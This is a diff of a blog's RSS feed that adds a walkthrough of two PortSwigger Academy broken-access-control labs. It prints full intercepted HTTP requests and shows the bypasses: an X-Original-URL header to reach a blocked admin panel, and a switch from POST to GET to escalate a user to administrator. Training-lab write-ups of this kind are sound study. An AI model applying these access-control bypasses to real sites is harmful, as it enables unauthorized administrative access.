@@ -1,4 +1,74 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>PortSwigger Academy - Path traversal.</title><link>https://alan.com.ar/posts/portswiggeracademypathtraversal/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademypathtraversal/</guid><pubDate>Wed, 09 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>PortSwigger Academy - More Broken Access Control Labs.</title><link>https://alan.com.ar/posts/portswiggeracademymoreaccesscontrollabs/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademymoreaccesscontrollabs/</guid><pubDate>Mon, 28 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;h2&gt;Lab: URL-based access control can be circumvented&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This website has an unauthenticated admin panel at &lt;code&gt;/admin&lt;/code&gt;, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the &lt;code&gt;X-Original-URL&lt;/code&gt; header.&lt;br /&gt;
+To solve the lab, access the admin panel and delete the user &lt;code&gt;carlos&lt;/code&gt;.&lt;br /&gt;
+Link to lab: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;When trying to access the Admin panel via the front end system, we get &quot;access denied&quot;.
+When intercepting the request it looks like:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /admin HTTP/1.1
+Host: 0a4100100341d6af81f4bb30009d00ae.web-security-academy.net
+Cookie: session=57EynBodRDJEQ7CmkwnYzAR2kh24whYR
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a4100100341d6af81f4bb30009d00ae.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What we did was replace&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /admin HTTP/1.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;for&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST HTTP/2 HTTP/2
+X-Original-Url: /admin/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And this led us to the admin panel in the response. From there we can use the information to delete the carlos username (/admin/delete?username=carlos)&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Lab: Method-based access control can be circumvented&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials &lt;code&gt;administrator:admin&lt;/code&gt;.&lt;br /&gt;
+To solve the lab, log in using the credentials &lt;code&gt;wiener:peter&lt;/code&gt; and exploit the flawed access controls to promote yourself to become an administrator.&lt;br /&gt;
+Link to lab: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Using the admin credentials we see that the role upgrade request looks like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /admin-roles HTTP/2
+Host: 0a3500760486f48e80ed35c4002d0086.web-security-academy.net
+Cookie: session=jzjXTYjlxHZIyKGW4a1IEsYfwHruxGZU
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://0a3500760486f48e80ed35c4002d0086.web-security-academy.net
+Referer: https://0a3500760486f48e80ed35c4002d0086.web-security-academy.net/admin
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+username=carlos&amp;amp;action=upgrade
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Trying to use the same request from wiener&apos;s user is not feasible, you get &quot;Unauthorized&quot;. Instead I replaced the POST method for GET
+changing&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /admin-roles HTTP/2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;for&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /admin-roles?username=wiener&amp;amp;action=upgrade HTTP/2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;(Easier way of doing it I didn&apos;t know: right-clicking and selecting &quot;Change request method&quot;.)&lt;/p&gt;
+</content:encoded></item><item><title>PortSwigger Academy - Path traversal.</title><link>https://alan.com.ar/posts/portswiggeracademypathtraversal/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademypathtraversal/</guid><pubDate>Wed, 09 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
 &lt;p&gt;https://portswigger.net/web-security/learning-paths/path-traversal&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;This learning path covers path traversal vulnerabilities. You&apos;ll learn how to carry out path traversal attacks and circumvent common obstacles. You&apos;ll also learn how to prevent path traversal attacks.&lt;/p&gt;
